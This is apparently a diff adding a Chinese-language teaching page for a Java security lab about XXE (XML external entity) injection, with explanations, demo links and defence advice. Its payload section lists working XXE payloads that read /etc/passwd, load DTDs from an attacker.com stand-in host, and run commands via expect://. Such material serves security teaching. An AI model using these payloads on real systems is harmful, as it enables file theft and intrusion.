@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXE外部实体注入演示 - Java Security Lab</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .hero-section { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 60px 0; }
+        .demo-card { transition: transform 0.3s; border: none; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .demo-card:hover { transform: translateY(-5px); box-shadow: 0 8px 15px rgba(0,0,0,0.2); }
+        .attack-type { border-left: 4px solid #dc3545; }
+        .payload-box { background-color: #f8f9fa; border: 1px solid #dee2e6; font-family: monospace; }
+        .risk-high { color: #dc3545; }
+        .risk-medium { color: #fd7e14; }
+        .risk-low { color: #28a745; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container">
+            <a class="navbar-brand" href="/">Java Security Lab</a>
+            <div class="navbar-nav ms-auto">
+                <a class="nav-link" href="/">返回首页</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <div class="container text-center">
+            <h1 class="display-4 mb-4"><i class="fas fa-file-code"></i> XXE外部实体注入演示</h1>
+            <p class="lead mb-4">XML External Entity (XXE) 注入是一种针对解析XML输入的应用程序的攻击</p>
+            <div class="row justify-content-center">
+                <div class="col-md-8">
+                    <div class="alert alert-warning">
+                        <h5><i class="fas fa-exclamation-triangle"></i> 安全警告</h5>
+                        <p class="mb-0">本演示仅用于教育目的，请勿在生产环境或未授权系统中使用这些技术</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="container mt-5">
+        <!-- XXE简介 -->
+        <div class="row mb-5">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h3><i class="fas fa-info-circle"></i> 什么是XXE攻击？</h3>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h5>攻击原理：</h5>
+                                <ul>
+                                    <li>利用XML解析器处理外部实体引用</li>
+                                    <li>通过DOCTYPE声明定义恶意实体</li>
+                                    <li>读取服务器本地文件或发起网络请求</li>
+                                    <li>可能导致敏感信息泄露或SSRF攻击</li>
+                                </ul>
+                                
+                                <h5>常见危害：</h5>
+                                <ul>
+                                    <li><span class="risk-high">敏感文件读取</span> - 读取/etc/passwd等系统文件</li>
+                                    <li><span class="risk-high">内网探测</span> - 扫描内网服务和端口</li>
+                                    <li><span class="risk-medium">拒绝服务</span> - 消耗服务器资源</li>
+                                    <li><span class="risk-medium">信息泄露</span> - 获取配置信息</li>
+                                </ul>
+                            </div>
+                            <div class="col-md-6">
+                                <h5>XXE攻击类型：</h5>
+                                <div class="list-group">
+                                    <div class="list-group-item attack-type">
+                                        <strong>In-band XXE</strong><br>
+                                        <small>直接在响应中返回攻击结果</small>
+                                    </div>
+                                    <div class="list-group-item attack-type">
+                                        <strong>Error-based XXE</strong><br>
+                                        <small>通过错误信息泄露敏感数据</small>
+                                    </div>
+                                    <div class="list-group-item attack-type">
+                                        <strong>Blind XXE</strong><br>
+                                        <small>无直接响应，通过外部回调确认</small>
+                                    </div>
+                                    <div class="list-group-item attack-type">
+                                        <strong>Out-of-band XXE</strong><br>
+                                        <small>通过外部通道获取数据</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 演示模块 -->
+        <div class="row mb-5">
+            <div class="col-12">
+                <h3 class="mb-4"><i class="fas fa-flask"></i> XXE攻击演示模块</h3>
+            </div>
+            
+            <div class="col-md-6 mb-4">
+                <div class="card demo-card h-100">
+                    <div class="card-body">
+                        <h5 class="card-title"><i class="fas fa-play-circle text-primary"></i> 基础XXE攻击</h5>
+                        <p class="card-text">演示基本的XXE攻击原理，包括安全和不安全的XML解析对比。</p>
+                        <ul class="list-unstyled">
+                            <li><i class="fas fa-check text-success"></i> XML解析对比</li>
+                            <li><i class="fas fa-check text-success"></i> 实体注入演示</li>
+                            <li><i class="fas fa-check text-success"></i> 安全配置展示</li>
+                        </ul>
+                        <a href="/xxe/basic" class="btn btn-primary">开始演示</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6 mb-4">
+                <div class="card demo-card h-100">
+                    <div class="card-body">
+                        <h5 class="card-title"><i class="fas fa-file-alt text-danger"></i> 文件读取攻击</h5>
+                        <p class="card-text">演示通过XXE读取服务器本地文件的攻击技术。</p>
+                        <ul class="list-unstyled">
+                            <li><i class="fas fa-check text-success"></i> 系统文件读取</li>
+                            <li><i class="fas fa-check text-success"></i> 敏感信息获取</li>
+                            <li><i class="fas fa-check text-success"></i> 文件内容分析</li>
+                        </ul>
+                        <a href="/xxe/file" class="btn btn-danger">开始演示</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6 mb-4">
+                <div class="card demo-card h-100">
+                    <div class="card-body">
+                        <h5 class="card-title"><i class="fas fa-external-link-alt text-warning"></i> 外部DTD攻击</h5>
+                        <p class="card-text">演示通过外部DTD文件进行XXE攻击的高级技术。</p>
+                        <ul class="list-unstyled">
+                            <li><i class="fas fa-check text-success"></i> 外部DTD加载</li>
+                            <li><i class="fas fa-check text-success"></i> 参数实体利用</li>
+                            <li><i class="fas fa-check text-success"></i> 网络请求发起</li>
+                        </ul>
+                        <a href="/xxe/dtd" class="btn btn-warning">开始演示</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6 mb-4">
+                <div class="card demo-card h-100">
+                    <div class="card-body">
+                        <h5 class="card-title"><i class="fas fa-eye-slash text-info"></i> Blind XXE攻击</h5>
+                        <p class="card-text">演示无直接响应的盲注XXE攻击技术。</p>
+                        <ul class="list-unstyled">
+                            <li><i class="fas fa-check text-success"></i> 盲注检测技术</li>
+                            <li><i class="fas fa-check text-success"></i> 外部回调确认</li>
+                            <li><i class="fas fa-check text-success"></i> 数据外带技术</li>
+                        </ul>
+                        <a href="/xxe/blind" class="btn btn-info">开始演示</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 常见XXE载荷 -->
+        <div class="row mb-5">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h4><i class="fas fa-bomb"></i> 常见XXE攻击载荷</h4>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>文件读取载荷：</h6>
+                                <div class="payload-box p-2 mb-3">
+                                    <code>&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;<br>&lt;root&gt;&amp;xxe;&lt;/root&gt;</code>
+                                </div>
+                                
+                                <h6>外部DTD载荷：</h6>
+                                <div class="payload-box p-2 mb-3">
+                                    <code>&lt;!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd"&gt;<br>&lt;root&gt;&lt;/root&gt;</code>
+                                </div>
+                                
+                                <h6>参数实体载荷：</h6>
+                                <div class="payload-box p-2 mb-3">
+                                    <code>&lt;!DOCTYPE root [&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;%xxe;]&gt;<br>&lt;root&gt;&lt;/root&gt;</code>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>Blind XXE载荷：</h6>
+                                <div class="payload-box p-2 mb-3">
+                                    <code>&lt;!DOCTYPE root [&lt;!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"&gt;%xxe;]&gt;<br>&lt;root&gt;&lt;/root&gt;</code>
+                                </div>
+                                
+                                <h6>协议利用载荷：</h6>
+                                <div class="payload-box p-2 mb-3">
+                                    <code>&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "expect://id"&gt;]&gt;<br>&lt;root&gt;&amp;xxe;&lt;/root&gt;</code>
+                                </div>
+                                
+                                <h6>PHP Filter载荷：</h6>
+                                <div class="payload-box p-2 mb-3">
+                                    <code>&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"&gt;]&gt;<br>&lt;root&gt;&amp;xxe;&lt;/root&gt;</code>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="mt-3">
+                            <button class="btn btn-outline-primary btn-sm" onclick="loadPayloads()">
+                                <i class="fas fa-download"></i> 加载更多载荷
+                            </button>
+                            <button class="btn btn-outline-success btn-sm ms-2" onclick="generateExample()">
+                                <i class="fas fa-code"></i> 生成示例
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- XXE类型详解 -->
+        <div class="row mb-5">
+            <div class="col-md-4">
+                <div class="card h-100">
+                    <div class="card-header bg-danger text-white">
+                        <h6><i class="fas fa-file-import"></i> 文件读取XXE</h6>
+                    </div>
+                    <div class="card-body">
+                        <p><strong>攻击原理：</strong>通过外部实体引用读取服务器本地文件</p>
+                        <p><strong>常见目标：</strong></p>
+                        <ul class="small">
+                            <li>/etc/passwd - 用户信息</li>
+                            <li>/etc/shadow - 密码哈希</li>
+                            <li>/proc/version - 系统版本</li>
+                            <li>配置文件 - 数据库连接等</li>
+                        </ul>
+                        <p><strong>危害等级：</strong> <span class="risk-high">极高</span></p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-4">
+                <div class="card h-100">
+                    <div class="card-header bg-warning text-dark">
+                        <h6><i class="fas fa-network-wired"></i> 网络请求XXE</h6>
+                    </div>
+                    <div class="card-body">
+                        <p><strong>攻击原理：</strong>通过外部实体发起网络请求，类似SSRF</p>
+                        <p><strong>攻击目标：</strong></p>
+                        <ul class="small">
+                            <li>内网服务扫描</li>
+                            <li>云元数据获取</li>
+                            <li>端口探测</li>
+                            <li>服务识别</li>
+                        </ul>
+                        <p><strong>危害等级：</strong> <span class="risk-medium">高</span></p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-4">
+                <div class="card h-100">
+                    <div class="card-header bg-info text-white">
+                        <h6><i class="fas fa-eye-slash"></i> 盲注XXE</h6>
+                    </div>
+                    <div class="card-body">
+                        <p><strong>攻击原理：</strong>无直接响应，通过外部回调或时间延迟确认</p>
+                        <p><strong>检测方法：</strong></p>
+                        <ul class="small">
+                            <li>DNS查询记录</li>
+                            <li>HTTP回调请求</li>
+                            <li>响应时间分析</li>
+                            <li>错误信息观察</li>
+                        </ul>
+                        <p><strong>危害等级：</strong> <span class="risk-medium">中</span></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 防护措施 -->
+        <div class="alert alert-success">
+            <h5><i class="fas fa-shield-alt"></i> XXE防护建议</h5>
+            <div class="row">
+                <div class="col-md-6">
+                    <h6>XML解析器配置：</h6>
+                    <ul>
+                        <li>禁用DOCTYPE声明处理</li>
+                        <li>禁用外部通用实体</li>
+                        <li>禁用外部参数实体</li>
+                        <li>禁用外部DTD加载</li>
+                        <li>禁用XInclude处理</li>
+                    </ul>
+                </div>
+                <div class="col-md-6">
+                    <h6>应用层防护：</h6>
+                    <ul>
+                        <li>使用安全的XML解析库</li>
+                        <li>实施严格的输入验证</li>
+                        <li>使用XML Schema验证</li>
+                        <li>避免用户控制XML结构</li>
+                        <li>定期更新解析库版本</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- 学习路径 -->
+        <div class="card mb-5">
+            <div class="card-header">
+                <h5><i class="fas fa-graduation-cap"></i> 建议学习路径</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-3">
+                        <div class="text-center">
+                            <div class="bg-primary text-white rounded-circle d-inline-flex align-items-center justify-content-center" style="width: 50px; height: 50px;">1</div>
+                            <h6 class="mt-2">基础概念</h6>
+                            <p class="small">了解XML和XXE基本原理</p>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="text-center">
+                            <div class="bg-danger text-white rounded-circle d-inline-flex align-items-center justify-content-center" style="width: 50px; height: 50px;">2</div>
+                            <h6 class="mt-2">文件读取</h6>
+                            <p class="small">掌握文件读取攻击技术</p>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="text-center">
+                            <div class="bg-warning text-white rounded-circle d-inline-flex align-items-center justify-content-center" style="width: 50px; height: 50px;">3</div>
+                            <h6 class="mt-2">高级技术</h6>
+                            <p class="small">学习DTD和盲注技术</p>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="text-center">
+                            <div class="bg-success text-white rounded-circle d-inline-flex align-items-center justify-content-center" style="width: 50px; height: 50px;">4</div>
+                            <h6 class="mt-2">防护实践</h6>
+                            <p class="small">实施有效的防护措施</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 系统信息 -->
+        <div class="card">
+            <div class="card-header">
+                <h6><i class="fas fa-info-circle"></i> 系统信息</h6>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <p><strong>XML解析器：</strong> <span id="xmlParser">DocumentBuilderFactory</span></p>
+                        <p><strong>Java版本：</strong> <span id="javaVersion">加载中...</span></p>
+                        <p><strong>安全配置：</strong> <span id="securityConfig" class="text-warning">部分启用</span></p>
+                    </div>
+                    <div class="col-md-6">
+                        <p><strong>当前时间：</strong> <span id="currentTime">加载中...</span></p>
+                        <p><strong>演示模式：</strong> <span class="text-info">教育环境</span></p>
+                        <p><strong>风险等级：</strong> <span class="text-danger">受控环境</span></p>
+                    </div>
+                </div>
+                <button class="btn btn-outline-info btn-sm" onclick="refreshSystemInfo()">
+                    <i class="fas fa-sync-alt"></i> 刷新信息
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        // 页面加载时初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            refreshSystemInfo();
+        });
+        
+        // 刷新系统信息
+        function refreshSystemInfo() {
+            document.getElementById('currentTime').textContent = new Date().toLocaleString('zh-CN');
+            document.getElementById('javaVersion').textContent = 'Java 11+';
+            
+            // 模拟检查安全配置
+            setTimeout(() => {
+                const configs = ['外部实体禁用', 'DOCTYPE限制', 'XInclude禁用'];
+                document.getElementById('securityConfig').innerHTML = 
+                    '<span class="text-success">' + configs.join(', ') + '</span>';
+            }, 1000);
+        }
+        
+        // 加载载荷列表
+        function loadPayloads() {
+            fetch('/xxe/payloads')
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log('载荷列表:', data.payloads);
+                    alert(`成功加载 ${data.count} 个XXE攻击载荷`);
+                } else {
+                    alert('加载载荷失败: ' + data.error);
+                }
+            })
+            .catch(error => {
+                console.error('加载载荷失败:', error);
+                alert('加载载荷失败: ' + error);
+            });
+        }
+        
+        // 生成示例
+        function generateExample() {
+            const types = ['safe', 'file', 'dtd', 'param', 'blind'];
+            const randomType = types[Math.floor(Math.random() * types.length)];
+            
+            fetch(`/xxe/example/${randomType}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    const modal = document.createElement('div');
+                    modal.innerHTML = `
+                        <div class="modal fade" id="exampleModal" tabindex="-1">
+                            <div class="modal-dialog modal-lg">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title">XML示例 - ${data.description}</h5>
+                                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                                    </div>
+                                    <div class="modal-body">
+                                        <pre><code>${data.xmlExample}</code></pre>
+                                        <p class="mt-3"><strong>说明：</strong>${data.description}</p>
+                                        <p><strong>长度：</strong>${data.length} 字符</p>
+                                    </div>
+                                    <div class="modal-footer">
+                                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">关闭</button>
+                                        <button type="button" class="btn btn-primary" onclick="copyToClipboard('${data.xmlExample.replace(/'/g, "\\'")}')">复制</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                    document.body.appendChild(modal);
+                    const modalInstance = new bootstrap.Modal(document.getElementById('exampleModal'));
+                    modalInstance.show();
+                    
+                    // 模态框关闭后移除元素
+                    document.getElementById('exampleModal').addEventListener('hidden.bs.modal', function() {
+                        document.body.removeChild(modal);
+                    });
+                } else {
+                    alert('生成示例失败: ' + data.error);
+                }
+            })
+            .catch(error => {
+                console.error('生成示例失败:', error);
+                alert('生成示例失败: ' + error);
+            });
+        }
+        
+        // 复制到剪贴板
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(function() {
+                alert('已复制到剪贴板');
+            }, function(err) {
+                console.error('复制失败:', err);
+                alert('复制失败');
+            });
+        }
+    </script>
+</body>
+</html>
